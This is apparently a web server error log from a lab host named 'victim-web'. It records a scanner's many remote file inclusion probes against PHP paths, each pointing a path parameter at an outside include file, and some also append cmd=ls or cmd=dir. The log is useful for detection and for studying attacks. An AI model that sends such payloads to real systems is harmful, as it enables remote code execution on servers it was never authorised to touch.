2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/usercp_register.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/usercp_viewprofile.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /includes/xhtml.php?d_root=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index1.php?=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index1.php?inc=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index1.php?inhalt=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index2.php?=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index2.php?content=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index2.php?s=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /index2.php?x=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /indexinfo.php?bibtexrootrel=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /indexk.php?lib_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /info.php?file=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /inhalt.php?dateien[news]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /init.php?API_HOME_DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /init.php?scriptpath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /initialize.php?hmail_config[includepath]=http://cirt.net/public/rfiinc.txt&cmd=dir HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /initiate.php?abs_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install.php?_NE[AbsPath]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install.php?install_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install/config.php?path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install/di.php?pathtoserverdata=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install/index.php?content_php=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /install/install3.php?database=none&cabsolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /integration/shortstat/configuration.php?SPL_CFG[dirroot]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interact/modules/forum/embedforum.php?CONFIG[LANGUAGE_CPATH]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interact/modules/scorm/lib.inc.php?CONFIG[BASE_PATH]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interface/billing/billing_process.php?srcdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interface/editors/-custom.php?bField[bf_data]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interface/editors/custom.php?bField[bf_data]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /interface/new/new_patient_save.php?srcdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /intern/admin/other/backup.php?admin=1&rootdir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /intern/clan/member_add.php?rootdir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /intern/config/forum.php?rootdir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /intern/config/key_2.php?rootdir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /ip.inc.php?type=1&cgipath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /joinus.php?vwar_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /joinus.php?vwar_root=http://cirt.net/public/rfiinc.txt?&cmd=ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /joomla_path/components/com_articles.php?absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /js/bbcodepress/bbcode-form.php?BBCODE_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /js/wptable-tinymce.php?ABSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /jscript.php?my_ms[root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /kernel/class/ixpts.class.php?IXP_ROOT_PATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /kernel/loadkernel.php?installPath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /kmitaadmin/kmitam/htmlcode.php?file=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /kmitaadmin/kmitat/htmlcode.php?file=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/24 00:33:17 [error] 55#55: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /ktmlpro/includes/ktedit/toolbar.php?dirDepth=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
